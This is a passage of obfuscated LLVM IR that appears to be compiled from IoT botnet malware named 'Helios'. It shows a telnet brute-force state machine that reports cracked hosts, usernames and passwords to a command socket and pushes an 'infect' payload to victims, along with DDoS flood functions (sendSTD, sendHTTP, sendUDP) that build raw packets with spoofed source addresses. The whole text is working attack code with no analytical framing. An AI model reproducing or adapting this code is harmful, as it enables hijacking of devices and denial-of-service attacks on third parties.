  %606 = icmp ne i32 %605, 0
  br i1 %606, label %607, label %646

; <label>:607:                                    ; preds = %599
  %608 = load i32, i32* %5, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %609
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %610, i32 0, i32 3
  %612 = load i8, i8* %611, align 1
  %613 = zext i8 %612 to i32
  %614 = icmp eq i32 %613, 2
  br i1 %614, label %615, label %619

; <label>:615:                                    ; preds = %607
  %616 = load i32, i32* %5, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %617
  call void @advance_state(%struct.telstate_t* %618, i32 7)
  br label %645

; <label>:619:                                    ; preds = %607
  %620 = load i32, i32* @HeliosCommSock, align 4
  %621 = load i32, i32* %5, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %622
  %624 = call i8* @get_telstate_host(%struct.telstate_t* %623)
  %625 = load i32, i32* %5, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %626
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %627, i32 0, i32 4
  %629 = load i8, i8* %628, align 2
  %630 = zext i8 %629 to i64
  %631 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %630
  %632 = load i8*, i8** %631, align 8
  %633 = load i32, i32* %5, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 5
  %637 = load i8, i8* %636, align 1
  %638 = zext i8 %637 to i64
  %639 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %638
  %640 = load i8*, i8** %639, align 8
  %641 = call i32 (i32, i8*, ...) @Heliosprintf(i32 %620, i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.348, i32 0, i32 0), i8* %624, i8* %632, i8* %640)
  %642 = load i32, i32* %5, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %643
  call void @advance_state(%struct.telstate_t* %644, i32 7)
  br label %645

; <label>:645:                                    ; preds = %619, %615
  br label %650

; <label>:646:                                    ; preds = %599
  %647 = load i32, i32* %5, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %648
  call void @reset_telstate(%struct.telstate_t* %649)
  br label %650

; <label>:650:                                    ; preds = %646, %645
  br label %651

; <label>:651:                                    ; preds = %650, %595
  br label %734

; <label>:652:                                    ; preds = %568
  %653 = load i32, i32* %5, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 7
  %657 = load i32, i32* %656, align 16
  %658 = add i32 %657, 184885297
  %659 = add i32 %658, 7
  %660 = sub i32 %659, 184885297
  %661 = add i32 %657, 7
  %662 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %663 = icmp ult i32 %660, %662
  br i1 %663, label %664, label %668

; <label>:664:                                    ; preds = %652
  %665 = load i32, i32* %5, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %666
  call void @reset_telstate(%struct.telstate_t* %667)
  br label %668

; <label>:668:                                    ; preds = %664, %652
  br label %733

; <label>:669:                                    ; preds = %108
  %670 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %671 = load i32, i32* %5, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 7
  store i32 %670, i32* %674, align 16
  %675 = load i32, i32* %5, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %676
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %677, i32 0, i32 0
  %679 = load i32, i32* %678, align 16
  %680 = call i64 @send(i32 %679, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.349, i32 0, i32 0), i64 4, i32 16384)
  %681 = icmp slt i64 %680, 0
  br i1 %681, label %682, label %683

; <label>:682:                                    ; preds = %669
  br label %683

; <label>:683:                                    ; preds = %682, %669
  %684 = load i32, i32* %5, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %685
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %686, i32 0, i32 0
  %688 = load i32, i32* %687, align 16
  %689 = call i64 @send(i32 %688, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.350, i32 0, i32 0), i64 7, i32 16384)
  %690 = icmp slt i64 %689, 0
  br i1 %690, label %691, label %692

; <label>:691:                                    ; preds = %683
  br label %692

; <label>:692:                                    ; preds = %691, %683
  %693 = load i32, i32* %5, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %694
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %695, i32 0, i32 0
  %697 = load i32, i32* %696, align 16
  %698 = load i8*, i8** @infect, align 8
  %699 = load i8*, i8** @infect, align 8
  %700 = call i64 @strlen(i8* %699) #10
  %701 = call i64 @send(i32 %697, i8* %698, i64 %700, i32 16384)
  %702 = icmp slt i64 %701, 0
  br i1 %702, label %703, label %707

; <label>:703:                                    ; preds = %692
  %704 = load i32, i32* %5, align 4
  %705 = sext i32 %704 to i64
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %705
  call void @reset_telstate(%struct.telstate_t* %706)
  br label %734

; <label>:707:                                    ; preds = %692
  %708 = load i32, i32* %5, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 7
  %712 = load i32, i32* %711, align 16
  %713 = sub i32 %712, 1193698824
  %714 = add i32 %713, 25
  %715 = add i32 %714, 1193698824
  %716 = add i32 %712, 25
  %717 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %718 = icmp ult i32 %715, %717
  br i1 %718, label %719, label %732

; <label>:719:                                    ; preds = %707
  %720 = load i32, i32* %5, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %721
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %722, i32 0, i32 3
  %724 = load i8, i8* %723, align 1
  %725 = zext i8 %724 to i32
  %726 = icmp ne i32 %725, 3
  br i1 %726, label %727, label %728

; <label>:727:                                    ; preds = %719
  br label %728

; <label>:728:                                    ; preds = %727, %719
  %729 = load i32, i32* %5, align 4
  %730 = sext i32 %729 to i64
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %730
  call void @reset_telstate(%struct.telstate_t* %731)
  br label %732

; <label>:732:                                    ; preds = %728, %707
  br label %733

; <label>:733:                                    ; preds = %732, %668, %564, %522, %470, %428, %380, %260, %108
  br label %734

; <label>:734:                                    ; preds = %733, %703, %651, %560, %548, %504, %466, %454, %411, %360, %356, %222, %191, %178
  %735 = load i32, i32* %5, align 4
  %736 = sub i32 0, %735
  %737 = sub i32 0, 1
  %738 = add i32 %736, %737
  %739 = sub i32 0, %738
  %740 = add nsw i32 %735, 1
  store i32 %739, i32* %5, align 4
  br label %91

; <label>:741:                                    ; preds = %91
  br label %89
                                                  ; No predecessors!
  ret void
}

declare i32 @time(...) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #2
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  br label %39

; <label>:39:                                     ; preds = %68, %3
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #2
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  br i1 %47, label %48, label %68

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* %7, align 4
  %50 = load i8*, i8** %13, align 8
  %51 = call i64 @send(i32 %49, i8* %50, i64 65, i32 0)
  %52 = load i32, i32* %7, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = sext i32 %55 to i64
  %57 = load i64, i64* %8, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = sub i64 0, %59
  %61 = sub i64 %57, %60
  %62 = add nsw i64 %57, %59
  %63 = icmp sge i64 %56, %61
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %48
  %65 = load i32, i32* %7, align 4
  %66 = call i32 @close(i32 %65)
  call void @_exit(i32 0) #12
  unreachable

; <label>:67:                                     ; preds = %48
  store i32 0, i32* %11, align 4
  br label %68

; <label>:68:                                     ; preds = %67, %39
  %69 = load i32, i32* %11, align 4
  %70 = sub i32 0, %69
  %71 = sub i32 0, 1
  %72 = add i32 %70, %71
  %73 = sub i32 0, %72
  %74 = add i32 %69, 1
  store i32 %73, i32* %11, align 4
  br label %39
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %20 = load i32, i32* %11, align 4
  %21 = sub i32 0, %19
  %22 = sub i32 0, %20
  %23 = add i32 %21, %22
  %24 = sub i32 0, %23
  %25 = add nsw i32 %19, %20
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %26

; <label>:26:                                     ; preds = %68, %6
  %27 = load i32, i32* %14, align 4
  %28 = load i32, i32* %12, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %73

; <label>:30:                                     ; preds = %26
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %32 = load i8*, i8** %7, align 8
  %33 = load i8*, i8** %10, align 8
  %34 = load i8*, i8** %8, align 8
  %35 = call i32 @rand() #2
  %36 = srem i32 %35, 36
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [789 x i8*], [789 x i8*]* @UserAgents, i64 0, i64 %37
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 (i8*, i8*, ...) @sprintf(i8* %31, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.387, i32 0, i32 0), i8* %32, i8* %33, i8* %34, i8* %39) #2
  %41 = call i32 @fork() #2
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %43, label %67

; <label>:43:                                     ; preds = %30
  br label %44

; <label>:44:                                     ; preds = %65, %43
  %45 = load i32, i32* %15, align 4
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = icmp sgt i32 %45, %46
  br i1 %47, label %48, label %66

; <label>:48:                                     ; preds = %44
  %49 = load i8*, i8** %8, align 8
  %50 = load i16, i16* %9, align 2
  %51 = call i32 @socket_connect(i8* %49, i16 zeroext %50)
  store i32 %51, i32* %13, align 4
  %52 = load i32, i32* %13, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %54, label %65

; <label>:54:                                     ; preds = %48
  %55 = load i32, i32* %13, align 4
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %58 = call i64 @strlen(i8* %57) #10
  %59 = call i64 @write(i32 %55, i8* %56, i64 %58)
  %60 = load i32, i32* %13, align 4
  %61 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %62 = call i64 @read(i32 %60, i8* %61, i64 1)
  %63 = load i32, i32* %13, align 4
  %64 = call i32 @close(i32 %63)
  br label %65

; <label>:65:                                     ; preds = %54, %48
  br label %44

; <label>:66:                                     ; preds = %44
  call void @exit(i32 0) #14
  unreachable

; <label>:67:                                     ; preds = %30
  br label %68

; <label>:68:                                     ; preds = %67
  %69 = load i32, i32* %14, align 4
  %70 = sub i32 0, 1
  %71 = sub i32 %69, %70
  %72 = add nsw i32 %69, 1
  store i32 %71, i32* %14, align 4
  br label %26

; <label>:73:                                     ; preds = %26
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %41

; <label>:37:                                     ; preds = %8
  %38 = call i32 @rand_cmwc()
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %46

; <label>:41:                                     ; preds = %8
  %42 = load i32, i32* %10, align 4
  %43 = trunc i32 %42 to i16
  %44 = call zeroext i16 @htons(i16 zeroext %43) #13
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  br label %46

; <label>:46:                                     ; preds = %41, %37
  %47 = load i8*, i8** %9, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %338

; <label>:52:                                     ; preds = %46
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %14, align 4
  store i32 %55, i32* %18, align 4
  %56 = load i32, i32* %12, align 4
  %57 = icmp eq i32 %56, 32
  br i1 %57, label %58, label %131

; <label>:58:                                     ; preds = %52
  %59 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %59, i32* %19, align 4
  %60 = load i32, i32* %19, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %63, label %62

; <label>:62:                                     ; preds = %58
  br label %338

; <label>:63:                                     ; preds = %58
  %64 = load i32, i32* %13, align 4
  %65 = add i32 %64, 980936227
  %66 = add i32 %65, 1
  %67 = sub i32 %66, 980936227
  %68 = add nsw i32 %64, 1
  %69 = sext i32 %67 to i64
  %70 = call noalias i8* @malloc(i64 %69) #2
  store i8* %70, i8** %20, align 8
  %71 = load i8*, i8** %20, align 8
  %72 = icmp eq i8* %71, null
  br i1 %72, label %73, label %74

; <label>:73:                                     ; preds = %63
  br label %338

; <label>:74:                                     ; preds = %63
  %75 = load i8*, i8** %20, align 8
  %76 = load i32, i32* %13, align 4
  %77 = sub i32 0, 1
  %78 = sub i32 %76, %77
  %79 = add nsw i32 %76, 1
  %80 = sext i32 %78 to i64
  call void @llvm.memset.p0i8.i64(i8* %75, i8 0, i64 %80, i32 1, i1 false)
  %81 = load i8*, i8** %20, align 8
  %82 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %81, i32 %82)
  %83 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %84 = load i32, i32* %11, align 4
  %85 = add i32 %83, -560273152
  %86 = add i32 %85, %84
  %87 = sub i32 %86, -560273152
  %88 = add nsw i32 %83, %84
  store i32 %87, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %89

; <label>:89:                                     ; preds = %125, %121, %111, %74
  %90 = load i32, i32* %19, align 4
  %91 = load i8*, i8** %20, align 8
  %92 = load i32, i32* %13, align 4
  %93 = sext i32 %92 to i64
  %94 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %95 = call i64 @sendto(i32 %90, i8* %91, i64 %93, i32 0, %struct.sockaddr* %94, i32 16)
  %96 = load i32, i32* %22, align 4
  %97 = load i32, i32* %18, align 4
  %98 = icmp eq i32 %96, %97
  br i1 %98, label %99, label %112

; <label>:99:                                     ; preds = %89
  %100 = load i32, i32* %10, align 4
  %101 = icmp eq i32 %100, 0
  br i1 %101, label %102, label %106

; <label>:102:                                    ; preds = %99
  %103 = call i32 @rand_cmwc()
  %104 = trunc i32 %103 to i16
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  br label %106

; <label>:106:                                    ; preds = %102, %99
  %107 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %108 = load i32, i32* %21, align 4
  %109 = icmp sgt i32 %107, %108
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %106
  br label %130

; <label>:111:                                    ; preds = %106
  store i32 0, i32* %22, align 4
  br label %89

; <label>:112:                                    ; preds = %89
  %113 = load i32, i32* %22, align 4
  %114 = sub i32 %113, -1664306468
  %115 = add i32 %114, 1
  %116 = add i32 %115, -1664306468
  %117 = add i32 %113, 1
  store i32 %116, i32* %22, align 4
  %118 = load i32, i32* %23, align 4
  %119 = load i32, i32* %15, align 4
  %120 = icmp eq i32 %118, %119
  br i1 %120, label %121, label %125

; <label>:121:                                    ; preds = %112
  %122 = load i32, i32* %16, align 4
  %123 = mul nsw i32 %122, 1000
  %124 = call i32 @usleep(i32 %123)
  store i32 0, i32* %23, align 4
  br label %89

; <label>:125:                                    ; preds = %112
  %126 = load i32, i32* %23, align 4
  %127 = sub i32 0, 1
  %128 = sub i32 %126, %127
  %129 = add i32 %126, 1
  store i32 %128, i32* %23, align 4
  br label %89

; <label>:130:                                    ; preds = %110
  br label %338

; <label>:131:                                    ; preds = %52
  %132 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %132, i32* %24, align 4
  %133 = load i32, i32* %24, align 4
  %134 = icmp ne i32 %133, 0
  br i1 %134, label %136, label %135

; <label>:135:                                    ; preds = %131
  br label %338

; <label>:136:                                    ; preds = %131
  store i32 1, i32* %25, align 4
  %137 = load i32, i32* %24, align 4
  %138 = bitcast i32* %25 to i8*
  %139 = call i32 @setsockopt(i32 %137, i32 0, i32 3, i8* %138, i32 4) #2
  %140 = icmp slt i32 %139, 0
  br i1 %140, label %141, label %142

; <label>:141:                                    ; preds = %136
  br label %338

; <label>:142:                                    ; preds = %136
  store i32 50, i32* %26, align 4
  br label %143

; <label>:143:                                    ; preds = %149, %142
  %144 = load i32, i32* %26, align 4
  %145 = sub i32 0, -1
  %146 = sub i32 %144, %145
  %147 = add nsw i32 %144, -1
  store i32 %146, i32* %26, align 4
  %148 = icmp ne i32 %144, 0
  br i1 %148, label %149, label %159

; <label>:149:                                    ; preds = %143
  %150 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %151 = call i32 @rand_cmwc()
  %152 = xor i32 %150, -1
  %153 = and i32 %151, %152
  %154 = xor i32 %151, -1
  %155 = and i32 %150, %154
  %156 = or i32 %153, %155
  %157 = xor i32 %150, %151
  call void @srand(i32 %156) #2
  %158 = call i32 @rand() #2
  call void @init_rand(i32 %158)
  br label %143

; <label>:159:                                    ; preds = %143
  %160 = load i32, i32* %12, align 4
  %161 = icmp eq i32 %160, 0
  br i1 %161, label %162, label %163

; <label>:162:                                    ; preds = %159
  store i32 0, i32* %27, align 4
  br label %180

; <label>:163:                                    ; preds = %159
  %164 = load i32, i32* %12, align 4
  %165 = sub i32 32, 1025310366
  %166 = sub i32 %165, %164
  %167 = add i32 %166, 1025310366
  %168 = sub nsw i32 32, %164
  %169 = shl i32 1, %167
  %170 = add i32 %169, -535885
  %171 = sub i32 %170, 1
  %172 = sub i32 %171, -535885
  %173 = sub nsw i32 %169, 1
  %174 = xor i32 %172, -1
  %175 = and i32 -1, %174
  %176 = xor i32 -1, -1
  %177 = and i32 %172, %176
  %178 = or i32 %175, %177
  %179 = xor i32 %172, -1
  store i32 %178, i32* %27, align 4
  br label %180

; <label>:180:                                    ; preds = %163, %162
  %181 = load i32, i32* %13, align 4
  %182 = sext i32 %181 to i64
  %183 = sub i64 0, %182
  %184 = sub i64 28, %183
  %185 = add i64 28, %182
  %186 = call i8* @llvm.stacksave()
  store i8* %186, i8** %28, align 8
  %187 = alloca i8, i64 %184, align 16
  %188 = bitcast i8* %187 to %struct.iphdr*
  store %struct.iphdr* %188, %struct.iphdr** %29, align 8
  %189 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %190 = bitcast %struct.iphdr* %189 to i8*
  %191 = getelementptr i8, i8* %190, i64 20
  %192 = bitcast i8* %191 to %struct.udphdr*
  store %struct.udphdr* %192, %struct.udphdr** %30, align 8
  %193 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %195 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %194, i32 0, i32 0
  %196 = load i32, i32* %195, align 4
  %197 = load i32, i32* %27, align 4
  %198 = call i32 @GetRandomIP(i32 %197)
  %199 = call i32 @htonl(i32 %198) #13
  %200 = load i32, i32* %13, align 4
  %201 = sext i32 %200 to i64
  %202 = add i64 8, 9016585959821671292
  %203 = add i64 %202, %201
  %204 = sub i64 %203, 9016585959821671292
  %205 = add i64 8, %201
  %206 = trunc i64 %204 to i32
  call void @makeIPPacket(%struct.iphdr* %193, i32 %196, i32 %199, i8 zeroext 17, i32 %206)
  %207 = load i32, i32* %13, align 4
  %208 = sext i32 %207 to i64
  %209 = sub i64 0, 8
  %210 = sub i64 0, %208
  %211 = add i64 %209, %210
  %212 = sub i64 0, %211
  %213 = add i64 8, %208
  %214 = trunc i64 %212 to i16
  %215 = call zeroext i16 @htons(i16 zeroext %214) #13
  %216 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %217 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %216, i32 0, i32 0
  %218 = bitcast %union.anon.2* %217 to %struct.anon.3*
  %219 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %218, i32 0, i32 2
  store i16 %215, i16* %219, align 2
  %220 = call i32 @rand_cmwc()
  %221 = trunc i32 %220 to i16
  %222 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %223 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon.2* %223 to %struct.anon.3*
  %225 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %224, i32 0, i32 0
  store i16 %221, i16* %225, align 2
  %226 = load i32, i32* %10, align 4
  %227 = icmp eq i32 %226, 0
  br i1 %227, label %228, label %230

; <label>:228:                                    ; preds = %180
  %229 = call i32 @rand_cmwc()
  br label %235

; <label>:230:                                    ; preds = %180
  %231 = load i32, i32* %10, align 4
  %232 = trunc i32 %231 to i16
  %233 = call zeroext i16 @htons(i16 zeroext %232) #13
  %234 = zext i16 %233 to i32
  br label %235

; <label>:235:                                    ; preds = %230, %228
  %236 = phi i32 [ %229, %228 ], [ %234, %230 ]
  %237 = trunc i32 %236 to i16
  %238 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %239 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %238, i32 0, i32 0
  %240 = bitcast %union.anon.2* %239 to %struct.anon.3*
  %241 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %240, i32 0, i32 1
  store i16 %237, i16* %241, align 2
  %242 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 0
  %244 = bitcast %union.anon.2* %243 to %struct.anon.3*
  %245 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %244, i32 0, i32 3
  store i16 0, i16* %245, align 2
  %246 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %247 = bitcast %struct.udphdr* %246 to i8*
  %248 = getelementptr inbounds i8, i8* %247, i64 8
  %249 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %248, i32 %249)
  %250 = bitcast i8* %187 to i16*
  %251 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 2
